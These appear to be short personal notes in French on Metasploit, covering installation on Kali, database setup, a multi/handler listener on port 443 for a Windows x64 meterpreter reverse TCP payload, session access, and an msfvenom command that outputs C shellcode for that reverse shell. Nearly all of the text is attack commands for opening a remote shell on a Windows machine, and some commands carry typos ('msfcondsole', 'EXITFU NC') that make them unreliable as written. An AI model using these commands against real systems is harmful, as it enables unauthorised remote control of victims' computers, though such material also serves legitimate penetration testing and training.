# Notes :

## Metasploit

### Installation de msf sur kali :

`sudo apt install metasploit-framework`

### Mise en place de MSF

`sudo msfdb init`

### Utilisation

`sudo msfcondsole -q`

`use exploit/multi/handler`

`set lhost eth0`

`set lport 443`

`set payload windows/x64/meterpreter/reverse_tcp`

`run -j`

Pour acceder a la session une fois la connexion faite :
`sessions -i 1`


## Creation du shell code avec MSF

l'architecture est importante !

`msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=host LPORT=443 EXITFU NC=thread -f c --var-name=shellcode`
